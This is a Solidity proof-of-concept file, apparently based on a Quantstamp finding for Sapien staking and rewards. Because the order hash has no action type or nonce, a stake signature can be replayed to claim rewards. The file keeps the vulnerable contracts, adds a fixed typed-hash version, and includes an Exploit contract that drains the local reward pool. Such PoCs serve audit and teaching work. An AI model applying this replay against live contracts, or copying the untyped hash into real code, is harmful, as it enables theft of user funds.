// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Sapien staking and rewards (Quantstamp, June 2025).
    verifyOrder hashes keccak256(abi.encodePacked(userWallet, amount, orderId))
    with no action type and no nonce. A signature made for a stake order is
    accepted by claimReward. One precomputed signature moves 1,000 reward tokens.
*/

contract RewardToken {
    string public symbol = "SAPIEN";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract OrderHash {
    function hashOrder(address userWallet, uint256 amount, bytes32 orderId) external pure returns (bytes32) {
        // @> VULN: stake and reward orders share this preimage. No type and no nonce.
        return keccak256(abi.encodePacked(userWallet, amount, orderId));
    }
}

contract OrderHashTyped {
    function hashStake(address userWallet, uint256 amount, bytes32 orderId) external pure returns (bytes32) {
        return keccak256(abi.encodePacked("STAKE", userWallet, amount, orderId));
    }

    function hashReward(address userWallet, uint256 amount, bytes32 orderId) external pure returns (bytes32) {
        return keccak256(abi.encodePacked("REWARD", userWallet, amount, orderId));
    }
}

contract SapienRewards {
    RewardToken public immutable token;
    address public immutable signer;
    OrderHash public immutable hasher;

    constructor(RewardToken _token, address _signer, OrderHash _hasher) {
        token = _token;
        signer = _signer;
        hasher = _hasher;
    }

    function claimReward(address userWallet, uint256 amount, bytes32 orderId, uint8 v, bytes32 r, bytes32 s) external {
        bytes32 messageHash = hasher.hashOrder(userWallet, amount, orderId);
        address recovered = ecrecover(messageHash, v, r, s);
        require(recovered == signer && recovered != address(0), "sig");
        token.transfer(userWallet, amount);
    }
}

contract SapienRewardsFixed {
    RewardToken public immutable token;
    address public immutable signer;
    OrderHashTyped public immutable hasher;

    constructor(RewardToken _token, address _signer, OrderHashTyped _hasher) {
        token = _token;
        signer = _signer;
        hasher = _hasher;
    }

    function claimReward(address userWallet, uint256 amount, bytes32 orderId, uint8 v, bytes32 r, bytes32 s) external {
        bytes32 messageHash = hasher.hashReward(userWallet, amount, orderId);
        address recovered = ecrecover(messageHash, v, r, s);
        require(recovered == signer && recovered != address(0), "sig");
        token.transfer(userWallet, amount);
    }
}

contract SapienStakingPreview {
    OrderHash public immutable hasher;

    constructor(OrderHash _hasher) {
        hasher = _hasher;
    }

    function stakeDigest(address userWallet, uint256 amount, bytes32 orderId) external view returns (bytes32) {
        return hasher.hashOrder(userWallet, amount, orderId);
    }
}

contract Exploit {
    address public constant USER = 0x1111111111111111111111111111111111111111;
    address public constant SIGNER = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
    uint256 public constant AMOUNT = 1000e18;
    bytes32 public constant ORDER = 0x4f524445525f313030305f310000000000000000000000000000000000000000;
    uint8 public constant V = 27;
    bytes32 public constant R = 0xe59b4bf1ff6ea1cf19867e4953cd3c9e56190a6424666ccdedb0e09859ebb374;
    bytes32 public constant S = 0x1eb5f965694130e3b83aa2d9f54f4ccfdefdf15aee40053e0e6e09bd8c42ddc3;

    RewardToken public token;
    OrderHash public hasher;
    SapienStakingPreview public staking;
    SapienRewards public rewards;

    constructor() {
        token = new RewardToken();
        hasher = new OrderHash();
        staking = new SapienStakingPreview(hasher);
        rewards = new SapienRewards(token, SIGNER, hasher);
        token.mint(address(rewards), AMOUNT);
    }

    function run() external {
        bytes32 stakeDigest = staking.stakeDigest(USER, AMOUNT, ORDER);
        bytes32 rewardDigest = hasher.hashOrder(USER, AMOUNT, ORDER);
        require(stakeDigest == rewardDigest, "same preimage");
        uint256 beforeBal = token.balanceOf(USER);
        require(beforeBal == 0, "user starts at 0");
        rewards.claimReward(USER, AMOUNT, ORDER, V, R, S);
        uint256 moved = token.balanceOf(USER);
        require(moved == AMOUNT, "moved 1000");
        require(token.balanceOf(address(rewards)) == 0, "pool emptied");
        require(moved - beforeBal == AMOUNT, "second action paid N");
    }
}
